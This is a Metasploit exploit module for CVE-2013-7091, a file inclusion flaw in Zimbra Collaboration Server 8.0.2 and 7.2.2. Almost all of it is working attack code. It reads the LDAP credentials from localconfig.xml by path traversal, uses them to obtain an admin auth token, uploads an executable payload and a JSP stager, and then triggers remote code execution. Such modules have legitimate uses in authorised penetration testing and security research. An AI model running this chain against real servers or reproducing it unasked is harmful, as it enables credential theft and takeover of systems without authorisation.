# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;rexml/document&#039;

class Metasploit3 < Msf::Exploit::Remote

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include REXML

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Zimbra Collaboration Server LFI&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a local file inclusion on Zimbra 8.0.2 and 7.2.2. The vulnerability
        allows an attacker to get the LDAP credentials from the localconfig.xml file. The stolen
        credentials allow the attacker to make requests to the service/admin/soap API. This can
        then be used to create an authentication token for the admin web interface. This access
        can be used to achieve remote code execution. This module has been tested on Zimbra
        Collaboration Server 8.0.2 with Ubuntu Server 12.04.
      },
      &#039;Author&#039;          =>
        [
          &#039;rubina119&#039;, # Vulnerability discovery
          &#039;Mekanismen <mattias[at]gotroot.eu>&#039; # Metasploit module
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;References&#039;      =>
        [
          [ &#039;CVE&#039;, &#039;2013-7091&#039; ],
          [ &#039;OSVDB&#039;, &#039;100747&#039; ],
          [ &#039;BID&#039;, &#039;64149&#039; ],
          [ &#039;EDB&#039;, &#039;30085&#039; ],
          [ &#039;URL&#039;, &#039;http://cxsecurity.com/issue/WLB-2013120097&#039; ]
        ],
      &#039;Privileged&#039;      => false,
      &#039;Platform&#039;        => [&#039;linux&#039;],
      &#039;Targets&#039;         =>
        [
         [ &#039;Zimbra 8.0.2 / Linux&#039;,
            {
              &#039;Arch&#039;      => ARCH_X86,
              &#039;Platform&#039;  => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;SSL&#039;         => true
        },
      &#039;DefaultTarget&#039;   => 0,
      &#039;DisclosureDate&#039;  => "Dec 06 2013"
    ))
    register_options(
      [
        Opt::RPORT(7071),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;Path to zimbraAdmin web application&#039;, &#039;/zimbraAdmin&#039;]),
        OptInt.new(&#039;DEPTH&#039;, [true, &#039;Traversal depth until to reach the root path&#039;, 9]),
        OptString.new(&#039;ZIMBRADIR&#039;, [true, &#039;Zimbra installation path on the target filesystem (/opt/zimbra by default)&#039;, &#039;/opt/zimbra&#039;])
      ])
  end

  def check
    res = send_traversal_query(traversal_path("conf/localconfig.xml"))

    unless res and res.code == 200
      return Exploit::CheckCode::Safe
    end

    #this response is ~100% gzipped
    begin
      text =  Rex::Text.ungzip(res.body)
    rescue Zlib::GzipFile::Error
      text = res.body
    end

    if text =~ /name=\\"zimbra_user\\">";\sa\["<value>(.*)<\/value>/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    print_status("#{peer} - Getting login credentials...")
    res = send_traversal_query(traversal_path("conf/localconfig.xml"))

    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Unable to access vulnerable URL")
    end

    #this response is ~100% gzipped
    begin
      text =  Rex::Text.ungzip(res.body)
    rescue Zlib::GzipFile::Error
      text = res.body.to_s
    end

    if text =~ /name=\\"zimbra_user\\">";\sa\["<value>(.*)<\/value>/
      zimbra_user = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to get login credentials")
    end

    if text =~ /name=\\"zimbra_ldap_password\\">";\sa\["<value>(.*)<\/value>/
      zimbra_pass = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to get login credentials")
    end

    print_good("#{peer} - Got login credentials!")
    print_status("#{peer} - Getting auth token...")

    soap_req = build_soap_req(zimbra_user, zimbra_pass) #lets get our hands foamy

    res = send_request_cgi({
      &#039;uri&#039;             => normalize_uri("service", "admin", "soap"),
      &#039;method&#039;          => &#039;POST&#039;,
      &#039;ctype&#039;           => &#039;application/soap+xml; charset="utf-8"&#039;,
      &#039;headers&#039;         =>
        {
          &#039;SOAPAction&#039;  => &#039;"urn:zimbraAdmin#AuthRequest"&#039;,
        },
      &#039;data&#039;            => soap_req
    })

    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Unable to access service URL")
    end

    if res.body.to_s =~ /<authToken>(.*)<\/authToken>/
      auth_token = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Unable to get auth token")
    end

    @cookie =  "ZM_ADMIN_AUTH_TOKEN=#{auth_token}"
    print_good("#{peer} - Got auth token!")

    #the initial POC for this vuln shows user creation with admin rights for the web interface, thats cool but a shell is even cooler
    #the web interface has a function to upload the latest version of the desktop client via /service/extension/clientUploader/upload/
    #the intent is for a ZCO file, whatever that is. However any file will do and it&#039;s placed in /downloads/ which we can reach, how handy!

    payload_name = rand_text_alpha(8+rand(8))
    stager_name = rand_text_alpha(8+rand(8)) + ".jsp"

    stager = gen_stager(payload_name)
    payload_elf = generate_payload_exe

    #upload payload
    print_status("#{peer} - Uploading payload")
    res = upload_file(payload_name, payload_elf)

    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Unable to get upload payload")
    end

    #upload jsp stager
    print_status("#{peer} - Uploading jsp stager")
    res = upload_file(stager_name, stager)

    unless res and res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Unable to upload stager")
    end

    register_files_for_cleanup(
      "../jetty/webapps/zimbra/downloads/#{stager_name}",
      "../jetty/webapps/zimbra/downloads/#{payload_name}"
    )

    print_status("#{peer} - Executing payload on /downloads/#{stager_name}")

    res = send_request_cgi({
      &#039;uri&#039;             => normalize_uri("downloads", stager_name),
      &#039;method&#039;          => &#039;GET&#039;,
    })
  end

  def traversal_path(file_name)
    ::File.join(
      "../" * datastore[&#039;DEPTH&#039;],
      datastore[&#039;ZIMBRADIR&#039;],
      file_name
    )
  end

  def send_traversal_query(traversal)
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, "res", "/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz"),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;encode_params&#039; => false,
      &#039;vars_get&#039; => {
       &#039;v&#039; => "091214175450",
       &#039;skin&#039; => "#{traversal}%00"
      }
    })

    return res
  end

  def upload_file(file_name, data)
    req_id = rand_text_numeric(2).to_s

    post_data = Rex::MIME::Message.new
    post_data.add_part("#{file_name}", nil, nil, "form-data; name=\"filename1\"")
    post_data.add_part("#{data}", "application/octet-stream", nil, "form-data; name=\"clientFile\"; filename=\"#{file_name}\"")
    post_data.add_part("#{req_id}", nil, nil, "form-data; name=\"requestId\"")

    n_data = post_data.to_s
    n_data = n_data.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    res = send_request_cgi({
      &#039;uri&#039;             => normalize_uri("service", "extension", "clientUploader", "upload"),
      &#039;method&#039;          => &#039;POST&#039;,
      &#039;ctype&#039;           => &#039;multipart/form-data; boundary=&#039; + post_data.bound,
      &#039;data&#039;            => n_data,
      &#039;cookie&#039;          => @cookie
    })

    return res
  end

  def build_soap_req(zimbra_user, zimbra_pass)
    xml = Document.new
    soap_var = "ns1:AuthRequest"

    xml.add_element(
      "soapenv:Envelope",
      {
        &#039;xmlns:xsi&#039;     => "http://www.w3.org/2001/XMLSchema-instance",
        &#039;xmlns:xsd&#039;     => "http://www.w3.org/2001/XMLSchema",
        &#039;xmlns:soapenv&#039; => "http://schemas.xmlsoap.org/soap/envelope/",
        &#039;xmlns:ser&#039;     => "http://service.emulation.ws.mercury.com",
        &#039;xmlns:env&#039;     => "http://www.w3.org/2003/05/soap-envelope",
        &#039;xmlns:ns1&#039;     => "urn:zimbraAdmin",
        &#039;xmlns:ns2&#039;     => "urn:zimbraAdmin",
     })

    xml.root.add_element("soapenv:Header")
    xml.root.add_element("soapenv:Body")

    header = xml.root.elements[1]
    body = xml.root.elements[2]

    header.add_element("ns2:context")
    body.add_element("ns1:AuthRequest")

    ns1 =  body.elements[1]
    ns1.add_element(
      "account",
      {
        &#039;by&#039; => "name"
      })

    ns1.add_element("password")

    ns1.elements["account"].text  = "#{zimbra_user}"
    ns1.elements["password"].text = "#{zimbra_pass}"

    return xml.to_s
  end

  def gen_stager(payload_name)
    stager  = "<%@ page import=\"java.util.*,java.io.*\"%>"
    stager += " <%"
    stager += " String uri = request.getRequestURI();"
    stager += " String filename = uri.substring(uri.lastIndexOf(\"/\")+1);"
    stager += " String jspfile = new java.io.File(application.getRealPath(request.getRequestURI())).getParent() + \"/\" + filename;"
    stager += " String payload = new java.io.File(application.getRealPath(request.getRequestURI())).getParent() + \"/#{payload_name}\";"
    stager += " Process p = Runtime.getRuntime().exec(\"chmod 700 \" + payload);"
    stager += " p.waitFor();"
    stager += " p = Runtime.getRuntime().exec(\"bash -c &#039;\" + payload + \"&#039;\");"
    stager += "%>"

    return stager
  end
end

